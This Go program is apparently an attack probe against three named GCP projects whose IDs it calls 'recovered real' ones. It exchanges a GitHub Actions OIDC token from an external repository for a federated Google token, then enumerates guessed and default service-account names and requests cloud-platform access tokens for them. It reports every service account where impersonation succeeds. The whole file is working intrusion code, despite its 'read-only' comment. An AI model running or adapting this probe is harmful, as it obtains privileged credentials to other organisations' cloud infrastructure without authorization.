package main

// Intent 42239 probe v3: use the recovered real project IDs (devops-828f86cd,
// devops-7743e969, devops-f467c7d5 control) to name CI/deploy SAs and test whether
// any roles/iam.workloadIdentityUser binding actually covers our EXTERNAL GitHub repo.
// READ-ONLY on target. No writes.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var client = &http.Client{Timeout: 45 * time.Second}

type tgt struct {
	num     string
	projID  string
	prov    string
}

var targets = []tgt{
	{"507686559040", "devops-828f86cd", "//iam.googleapis.com/projects/507686559040/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
	{"202458047894", "devops-7743e969", "//iam.googleapis.com/projects/202458047894/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
	{"597679076120", "devops-f467c7d5", "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
}

var saNames = []string{
	"github-actions", "github-actions-prod", "github-actions-staging", "github-actions-qa",
	"github-oidc", "cloudbuild", "deploy", "deployer", "deploy-sa", "terraform",
	"ci", "cicd", "ci-cd", "build", "builder", "runner", "gcs-sync", "service",
	"automation", "pipeline", "bot", "recurly-dbt", "dbt", "infra", "infra-deploy",
	"ops", "cloudrun", "cloud-run", "gke-deploy", "admin", "defectdojo", "atlantis",
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rdr)
	if err != nil {
		return 0, "req-err:" + err.Error()
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "  ", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func mintJWT(aud string) string {
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		return ""
	}
	u := reqURL + "&audience=" + url.QueryEscape(aud)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", "bearer "+reqTok)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var o struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &o)
	return o.Value
}

func genAT(ft, email string) (int, string) {
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	bd, _ := json.Marshal(map[string]interface{}{
		"scope":    []string{"https://www.googleapis.com/auth/cloud-platform"},
		"lifetime": "300s",
	})
	return httpDo("POST", u, ft, bd)
}

func main() {
	fmt.Println("=== INTENT42239 WIF PROBE V3 START ===")
	for _, t := range targets {
		fmt.Println("###### PROJECT", t.num, "id=", t.projID)
		jwt := mintJWT(t.prov)
		if jwt == "" {
			fmt.Println("  MINT_FAIL")
			continue
		}
		body, _ := json.Marshal(map[string]string{
			"audience":           t.prov,
			"grantType":          "urn:ietf:params:oauth:grant-type:token-exchange",
			"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
			"scope":              "https://www.googleapis.com/auth/cloud-platform",
			"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
			"subjectToken":       jwt,
		})
		st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", body)
		var tok struct {
			AccessToken string `json:"access_token"`
		}
		json.Unmarshal([]byte(sb), &tok)
		fmt.Printf("  STS=%d federated_len=%d\n", st, len(tok.AccessToken))
		if tok.AccessToken == "" {
			continue
		}
		ft := tok.AccessToken
		hits := 0
		for _, n := range saNames {
			e := n + "@" + t.projID + ".iam.gserviceaccount.com"
			s, b := genAT(ft, e)
			if s == 200 {
				fmt.Printf("  GENAT[%s] = 200 <<<<< SUCCESS\n", e)
				hits++
			} else if s != 404 {
				fmt.Printf("  GENAT[%s] = %d %s\n", e, s, trim(b, 120))
			}
		}
		// numeric-derived standard SAs
		for _, e := range []string{
			t.num + "@cloudbuild.gserviceaccount.com",
			t.num + "-compute@developer.gserviceaccount.com",
		} {
			s, b := genAT(ft, e)
			fmt.Printf("  GENAT[%s] = %d %s\n", e, s, trim(b, 120))
		}
		fmt.Printf("  -- 200-count for %s: %d\n", t.projID, hits)
	}
	fmt.Println("=== INTENT42239 WIF PROBE V3 END ===")
}
